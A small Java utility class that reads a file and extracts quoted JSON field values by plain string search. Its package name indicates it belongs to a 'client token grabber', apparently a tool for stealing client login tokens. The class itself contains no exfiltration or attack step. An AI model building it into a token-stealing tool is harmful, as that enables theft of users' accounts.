package clienttokengrabber.utils;

import java.io.BufferedReader;
import java.nio.file.Files;
import java.nio.file.Path;

public class Json {
    private String data;

    public Json(Path path) {
        this.data = readFile(path);
    }

    public Json(String string) {
        this.data = string;
    }

    public String valueOf(String field) {
        int fieldIndex = this.data.indexOf("\"" + field + "\":");
        if (fieldIndex != -1) {
            int valueStartIndex = this.data.indexOf("\"", fieldIndex + field.length() + 2) + 1;
            int valueEndIndex = this.data.indexOf("\"", valueStartIndex);
            if (valueEndIndex != -1)
                return this.data.substring(valueStartIndex, valueEndIndex);
        }
        return null;
    }

    private String readFile(Path path) {
        StringBuilder data = new StringBuilder();
        try (BufferedReader reader = Files.newBufferedReader(path)) {
            String line;
            while ((line = reader.readLine()) != null)
                data.append(line);
        } catch (Exception ignored) {
        }
        return data.toString();
    }
}
